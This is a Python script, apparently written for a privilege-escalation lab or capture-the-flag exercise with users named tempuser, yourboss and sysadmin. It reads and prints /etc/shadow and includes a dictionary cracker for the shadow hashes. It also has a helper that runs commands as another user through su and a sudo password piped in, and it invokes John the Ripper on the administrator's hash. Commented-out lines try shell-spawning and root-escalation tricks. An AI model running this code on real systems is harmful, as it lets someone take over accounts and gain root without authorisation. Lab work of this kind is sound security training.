#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import crypt
import io
import pexpect
import subprocess


def crack_password(pwd_entry):
	""" Returns the cracked password denoted by the given shadow file entry. """
	pwd_entry = pwd_entry.split('$')

	salt = '$' + pwd_entry[1] + '$' + pwd_entry[2] + '$'
	pwd_hash = pwd_entry[3][0:pwd_entry[3].find(':')]

	with open('/usr/share/dict/american-english-small', 'r') as words:
		for line in words.read().split('\n'):
			if crypt.crypt(line, salt) == (salt + pwd_hash):
				return line

	# Something went wrong
	return ''


def exec_cmd_as_user(user, password, command):
	""" Executes the given command as user elevated using sudo. """
	spawned = pexpect.spawn('su %s -c "echo %s | sudo -S %s"' % (user, password, command))
	ret_status = spawned.expect([pexpect.TIMEOUT, 'assword:']) # Catch both 'password:' and 'Password:'

	if ret_status == 0:
		return "Error: Process timed out"

	else:
		spawned.sendline(password)
		return spawned.read().decode('utf-8')


# We already know tempuser's password
temp_password = "correctbatteryhorsestaple99"

# Parse the shadow password file
with io.open('/etc/shadow', 'r', encoding='utf8') as shadow:
	for line in shadow.read().split('\n'):
		print(line)
		if line[0:8] == 'sysadmin':
			sysadmin_hash = line
		if line[0:8] == 'yourboss':
			yourboss_hash = line

# Crack the boss' password using custom method
yourboss_cracked = 'money'#crack_password(yourboss_hash) # should be 'money'
print(yourboss_cracked)

print(sysadmin_hash)

# Crack the admin's password using john
#spawned = pexpect.spawn('su yourboss -c "whoami"')
# Clean up sysadmin_hash
sysadmin_hash = sysadmin_hash[sysadmin_hash.find('$'):sysadmin_hash.replace(':', '', 1).find(':')]

# s = 'echo "' + sysadmin_hash + '" > /home/yourboss/temp_hash.txt'
# print(s)
# print(exec_cmd_as_user('yourboss', yourboss_cracked, s))



print(exec_cmd_as_user('yourboss', yourboss_cracked, 'cat /home/yourboss/temp_hash.txt'))

print(exec_cmd_as_user('yourboss', yourboss_cracked, 'john --wordlist=/usr/share/dict/american-english-small /home/yourboss/temp_hash.txt'))

'''
spawned = pexpect.spawn('su yourboss -c "echo %s | sudo -S "')
ret_status = spawned.expect([pexpect.TIMEOUT, 'assword:'])

if ret_status == 0:
	print("Process timed out")

else:
	spawned.sendline("money")
	print(spawned.read().decode('utf-8'))

echo "$yourboss_cracked" | su -c "whoami" - yourboss
'''
# python3 <(cat << EOF
#import sys
#import pty
#pty.spawn("/bin/bash whoami")
#print("here")
#EOF
#) bash -c 'cat > out.txt'

# whoami
# echo "$temp_password" | sudo -s <<EOF
# echo Now I am root
# whoami
#EOF
 
# Crack the sysadmin's password using john
# ./format_password.py "$sysadmin_hash" > temp_hash.txt
# sysadmin_hash=$(<temp_hash.txt)
# echo "$yourboss_cracked" | sudo -u yourboss john --wordlist=/usr/share/dict/american-english-small temp_hash.txt > temp.txt
# echo "$yourboss_cracked" | sudo -u yourboss john --show temp_hash.txt > temp.txt
# sysadmin_cracked=$(<temp.txt)
# echo $sysadmin_cracked

# Cleanup 
# rm temp.txt
# rm temp_hash.txt

